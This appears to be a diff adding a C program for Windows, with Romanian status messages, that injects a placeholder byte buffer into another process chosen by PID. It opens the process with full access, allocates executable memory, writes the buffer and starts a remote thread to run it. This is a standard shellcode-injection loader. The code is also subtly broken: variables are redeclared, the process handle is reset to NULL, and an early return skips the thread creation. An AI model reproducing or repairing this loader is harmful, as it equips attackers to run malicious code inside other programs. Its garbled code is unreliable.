@@ -1,0 +1,51 @@
+#include <windows.h>
+#include <stdio.h>
+#define PRINT_MSG(prefix, ...) printf(prefix " " __VA_ARGS__)
+#define PREFIX_POSITIVE "[+]"
+#define PREFIX_NEGATIVE "[-]"
+#define PREFIX_INFO "[*]"
+int main(int argc, char* argv[]) {
+     if (argc < 2) {
+          PRINT_MSG(PREFIX_NEGATIVE, "utilizare: %s <PID>\n", argv[0]);
+          return EXIT_FAILURE;
+     }
+     DWORD dwPID = atoi(argv[1]);
+     PRINT_MSG(PREFIX_INFO, "încercând să abordeze procesul (%ld)\n", dwPID);
+     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+     if (hProcess == NULL) {
+     PRINT_MSG(PREFIX_NEGATIVE, "nu a reușit să obțină o pârghie pentru proces, eroare: 0x%lx\n", GetLastError());
+     return EXIT_FAILURE;
+     }
+     PRINT_MSG(PREFIX_POSITIVE, "a primit o pârghie la proces\n\\---0x%p\n", hProcess);
+     PVOID rBuffer = NULL;
+     DWORD dwPID = 0, dwTID = 0;
+     HANDLE hProcess = NULL, hThread = NULL;
+     unsigned char document[] = "\ ... \ ... ";
+     size_t documentSize = sizeof(document);
+     PVOID rBuffer = VirtualAllocEx(hProcess, NULL, documentSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+     PRINT_MSG(PREFIX_POSITIVE, "alocat %zd-bytes la memoria procesului w/ PAGE_EXECUTE_READWRITE permisiuni\n", documentSize);
+     if (rBuffer == NULL) {
+         PRINT_MSG(PREFIX_NEGATIVE, "nu s-a alocat o pârghie, eroare: 0x%lx\n", GetLastError());
+         CloseHandle(hProcess);
+         return EXIT_FAILURE;
+     }
+     WriteProcessMemory(hProcess, rBuffer, document, documentSize, NULL);
+     PRINT_MSG(PREFIX_POSITIVE, "a scris %zd-bytes la buffer-ul alocat\n", sizeof(document));
+     return EXIT_SUCCESS;
+     HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, NULL);
+     if (hThread == NULL) {
+         PRINT_MSG(PREFIX_NEGATIVE, "nu s-a putut obține o pârghie pentru noua secvență, eroare: %ld\n", GetLastError());
+         VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
+         CloseHandle(hProcess);
+         return EXIT_FAILURE;
+     }
+     PRINT_MSG(PREFIX_POSITIVE, "s-a obținut o pârghie pentru noua secvență creată\n\\---0x%p\n", hProcess);
+     PRINT_MSG(PREFIX_INFO, "așteaptă ca secvența să se termine de executat\n");
+     WaitForSingleObject(hThread, INFINITE);
+     PRINT_MSG(PREFIX_POSITIVE, "secvență de executat s-a finalizat, curățare\n");
+     CloseHandle(hThread);
+     VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
+     CloseHandle(hProcess);
+     PRINT_MSG(PREFIX_POSITIVE, "terminat\n");
+     return EXIT_SUCCESS;
+}
